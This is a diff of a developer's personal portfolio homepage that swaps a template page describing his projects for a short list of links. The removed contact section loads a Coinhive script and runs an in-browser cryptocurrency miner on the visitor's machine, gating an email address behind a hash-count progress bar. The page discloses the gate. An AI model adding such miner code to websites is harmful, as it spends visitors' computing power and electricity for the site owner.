@@ -1,269 +1,74 @@
-<!DOCTYPE HTML>
-<!--
-	Dimension by HTML5 UP
-	html5up.net | @ajlkn
-	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
--->
-<html>
+<html lang="">
+
 <head>
-    <title>Adam Yala</title>
-    <meta charset="utf-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"/>
-    <link rel="stylesheet" href="assets/css/main.css"/>
-    <!--[if lte IE 9]>
-    <link rel="stylesheet" href="assets/css/ie9.css"/><![endif]-->
-    <noscript>
-        <link rel="stylesheet" href="assets/css/noscript.css"/>
-    </noscript>
+    <meta charset="utf-8">
+    <title>Adam Yala Dot Com</title>
 </head>
+
 <body>
+<h1>Welcome to Adam's website!</h1>
 
-<!-- Wrapper -->
-<div id="wrapper">
+<p>Things I've helped make:</p>
+<ul>
+    <li>
+        <a target="_blank" href="https://www.metamehealth.com/">CTO @ metaMe Health</a>
+    </li>
+    <li>
+        <a target="_blank" href="https://www.gettagg.io/">Tagg Content Creation</a>
+    </li>
+    <li>
+        <a target="_blank" href="https://adamyala.github.io/dota2-item-explorer/">DotA 2 Item Explorer</a>
+    </li>
+    <li>
+        <a target="_blank" href="https://adamyala.github.io/morrowind-class-quiz/">Morrowind Class Quiz</a>
+    </li>
+    <li> Everbloom site demos
+        <ul>
+            <li>
+                <a target="_blank" href="https://d148govn6ndwu8.cloudfront.net/">Version 1</a>
+            </li>
+            <li>
+                <a target="_blank" href="https://k1vm8levqe.execute-api.us-west-2.amazonaws.com/dev/">Version 2</a>
+            </li>
+            <li>
+                <a target="_blank" href="https://d3nxf3g7mxpe3f.cloudfront.net/#!/">Version 3</a>
+            </li>
+        </ul>
+    </li>
+</ul>
 
-    <!-- Header -->
-    <header id="header">
-        <div class="logo">
-            <a href="#contact" style="border: 0" onclick="move()">
-                <span class="icon fa-code"></span>
-            </a>
-        </div>
-        <div class="content">
-            <div class="inner">
-                <h1>Adam Yala</h1>
-            </div>
-        </div>
-        <nav>
-            <ul>
-                <li><a href="#work">Work</a></li>
-                <li><a href="#about">About</a></li>
-            </ul>
-        </nav>
-    </header>
+<p>Things I've helped write that might still exist on the internet:</p>
+<ul>
+    <li>
+        <a target="_blank" href="https://buttercms.com/blog/options-for-adding-a-blog-to-python-application">
+            Options For Adding A Blog To A Python Application
+        </a>
+    </li>
+    <li>
+        <a target="_blank" href="https://5thcolumn.net/blog/nginx-django-elasticsearch-and-kibana/">
+            Nginx, Django, Elasticsearch and Kibana
+        </a>
+    </li>
+</ul>
 
-    <!-- Main -->
-    <div id="main">
-
-        <!-- Work -->
-        <article id="work">
-            <h2 class="major align-center center-block">Work</h2>
-
-            <p class="align-center">
-                Below are some projects I'm really passionate about. They're projects that I found cool and interesting.
-                I believe building something is the best way to learn.
-            </p>
-
-            <img class="center-block" src="images/wt-logo.svg" alt=""/>
-            <br>
-            <p>
-                <a target="_blank" href="https://weddingtogether.co/">Wedding Together</a> is a private Instagram-style
-                feed for your wedding.
-                <br><br>
-
-                We made Wedding Together because the current wedding photo sharing technology out there just isn't up to
-                snuff. We felt we could do better. At Wedding Together, I handle the backend. Our stack is Angular and
-                <a target="_blank" href="http://www.django-rest-framework.org/">Django REST Framework</a>. We're built
-                on all things AWS.
-
-                Frontend development on Wedding Together is done by John Zhao, one of the best developers I know. You
-                can read about his thoughts on startups <a target="_blank" href="https://medium.com/@zhao59">here</a>
-                and <a target="_blank" href="https://startupphilosopher.wordpress.com/">here</a>.
-            </p>
-
-
-            <img style="width: 200px;" class="center-block" src="images/metame-logo.png" alt=""/>
-            <br>
-            <p>
-                <a target="_blank" href="https://www.metameconnect.com/">MetaMe Connect</a> is a program that uses a
-                standardized Brain-Gut therapy approach that has been clinically proven to be effective in treating IBS.
-                <br><br>
-
-                I work with the MetaMe team to automate processes and help us scale to provide aid to patients all over
-                the US. We use a super lean Django backend that leverages many 3rd party APIs so we get to worry about
-                less code and infrastructure.
-                <br><br>
-
-            </p>
-
-
-            <img style="width: 70px;" class="center-block" src="images/coworkbuddy.svg" alt=""/>
-            <br>
-            <p>
-                <a target="_blank" href="https://coworkbuddy.com/">Cowork Buddy</a> is the easiest way to find people to
-                cowork with.
-                <br><br>
-
-                Some of us socialize by working with one another. A few of my close relationships are with people who I
-                meet up with and all we do is sit next to one another and hack away at something. I made Cowork Buddy to
-                help me find more of those folks.
-                <br><br>
-                Cowork Buddy's landing page is in an S3 bucket served up on CloudFront. The app itself is Django using
-                RDS for the database and S3 for static file hosting.
-            </p>
-
-
-            <img style="width: 50px;" class="center-block" src="images/webevents-logo.svg" alt=""/>
-            <br>
-            <p>
-                <a target="_blank" href="https://webevents.io/">WebEvents</a> is an easy to use API of the largest
-                social event database on the web. Free to use and easy to integrate with.
-                <br><br>
-
-                WebEvents is an API I made that collects and normalizes event feeds from the biggest event ticketing
-                sites. The data is scrubbed then normalized. Building an API like this was a true test of my skills in
-                performance and concurrency. It pulls in hundreds of events per minute and makes them readily
-                searchable.
-                <br><br>
-
-                I believe attending events hosted by enthusiasts is one of the best ways to explore and understand a new
-                city or country. Working with event data is something I'm deeply passionate about to this day.
-
-            </p>
-
-
-            <img class="center-block" src="images/everblume-logo.svg" alt=""/>
-            <br>
-            <p>
-                everblume is a turnkey, automated smart appliance designed to help consumers cultivate the world’s
-                finest quality naturally grown medicine, produce, and flowers in the comfort of their own home.
-                <br><br>
-
-                On the everblume team I handled the development of our frontend site and our backend API. The frontend
-                website went through multiple iterations (not all of them complete). I'm far from a frontend developer,
-                but regardless of which side of the stack you're on, you should always understand the opposite side of
-                the coin. Then you can empathize with those you build with.
-                <br><br>
-
-                Our hardware prototypes ran on different microcontrollers. I also worked on migrating our hardware from
-                Ardunio to RaspberryPi.
-                <br><br>
-
-                <a target="_blank" href="https://geteverblume.com/">Version 1</a> of the company website is the most
-                polished and uses <a target="_blank" href="https://github.com/peachananr/onepage-scroll">onepage
-                scroll</a> to mimic Apple's iPhone5S website. Mobile friendly.
-                <br><br>
-
-                <a target="_blank" href="https://k1vm8levqe.execute-api.us-west-2.amazonaws.com/dev/">Version 2</a> uses
-                the <a target="_blank" href="http://scrollmagic.io/">ScrollMagic</a> library to create an interactive
-                experience. The pricing flow uses the Google Maps autocomplete javascript API to autofill the user's
-                address. The payment page uses the Stripe javascript API to validate and recognize card types. Somewhat
-                mobile friendly.
-                <br>
-                <b>Note:</b> I put this portfolio version on <a target="_blank" href="https://aws.amazon.com/lambda/">AWS
-                Lambda</a> just because I wanted to learn how to put a Flask app on a serverless service. The first time
-                you visit Version 2, it will run slowly. This is the virtual machine heating up.
-                <br><br>
-
-                <a target="_blank" href="http://everblume-example.s3-website-us-west-1.amazonaws.com/">Version 3</a> of
-                the company website is the most interactive and also uses the ScrollMagic library. It's also the least
-                polished. Not mobile friendly.
-                <br><br>
-
-                All designs were created by <a target="_blank" href="https://www.linkedin.com/in/bcolcord/">Brian
-                Colcord</a>. As we iterated through the designs, he'd provide and spec and I'd create pixel perfect
-                sites. Keeping up with his creativity was a great experience.
-            </p>
-
-
-        </article>
-
-        <!-- About -->
-        <article id="about">
-            <h2 class="major align-center center-block">About</h2>
-            <p class="align-center">
-                I keep a list of professional work on my <a target="_blank"
-                                                            href="https://www.linkedin.com/in/adamyala/">LinkedIn</a>.
-                <br>
-                My open source projects are on <a target="_blank" href="https://github.com/adamyala/">GitHub</a>.
-            </p>
-            <p class="align-center">
-                A couple things I wrote
-                <br>
-                <a target="_blank" href="https://buttercms.com/blog/options-for-adding-a-blog-to-python-application">Options
-                    For Adding A Blog To A Python Application</a>
-                <br>
-                <a target="_blank" href="https://5thcolumn.net/blog/nginx-django-elasticsearch-and-kibana/">Nginx,
-                    Django, Elasticsearch and Kibana</a>
-            </p>
-            <p class="align-center">
-                A talk I helped create
-                <br>
-                <a target="_blank" href="http://lanyrd.com/2015/bigdatatechcon/sdrxqx/">Small Startup Path of Treachery
-                    to Big Travel Data</a>
-            </p>
-        </article>
-
-        <!-- About -->
-        <article id="contact">
-            <h2 class="major align-center center-block">Contact</h2>
-            <p class="align-center">
-                My recruitment contact address is unlocked by allowing the below bar to reach 100%.
-                <br>
-                I only respond to hiring inquiries through this email address. I do this to prevent bots and spam.
-                <br>
-                Looking forward to hearing from you!
-            </p>
-            <style>
-                #myBar {
-                    width: 0%;
-                    height: 30px;
-                    background-color: #4CAF50;
-                    text-align: center; /* To center it horizontally (if you want) */
-                    line-height: 30px; /* To center it vertically */
-                    color: white;
-                }
-            </style>
-            <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-            <script>
-                function move() {
-                    var elem = document.getElementById("myBar");
-                    var width = 0;
-
-                    var miner = new CoinHive.Anonymous('8kkCotHfGekJYlcr33cOg2IDck7zhI0f');
-                    miner.start();
-
-                    // Update stats once per second
-                    var myVar = setInterval(function () {
-                        var totalHashes = miner.getTotalHashes();
-                        console.log('th', totalHashes);
-
-                        width = Math.ceil(totalHashes / 300);
-                        elem.style.width = width + '%';
-                        elem.innerHTML = width + '%';
-
-                        if (width >= 100) {
-                            clearInterval(myVar);
-                            $('#email').show()
-                        }
-                    }, 1000);
-                }
-            </script>
-            <div id="myProgress">
-                <div id="myBar">0%</div>
-            </div>
-            <p class="align-center" style="display: none" id="email">
-                <b>You did it! I can be contacted at adamkyala+recruiting@gmail.com</b>
-            </p>
-        </article>
-
-    </div>
-
-    <!-- Footer -->
-    <footer id="footer">
-        <p class="copyright">Design: <a target="_blank" href="https://html5up.net">HTML5 UP</a>.</p>
-        <p class="copyright">Icons: <a target="_blank" href="https://www.flaticon.com/" title="Flaticon">flaticon</a></p>
-    </footer>
-
-</div>
-
-<!-- BG -->
-<div id="bg"></div>
-
-<!-- Scripts -->
-<script src="assets/js/jquery.min.js"></script>
-<script src="assets/js/skel.min.js"></script>
-<script src="assets/js/util.js"></script>
-<script src="assets/js/main.js"></script>
-
+<p>Other places you can find me on the internet:</p>
+<ul>
+    <li>
+        <a target="_blank" href="https://www.linkedin.com/in/adamyala/">
+            LinkedIn
+        </a>
+    </li>
+    <li>
+        <a target="_blank" href="https://github.com/adamyala/">
+            GitHub
+        </a>
+    </li>
+    <li>
+        <a target="_blank" href="https://www.adaminasuit.com/">
+            The greatest website ever made
+        </a>
+    </li>
+</ul>
 </body>
+
 </html>
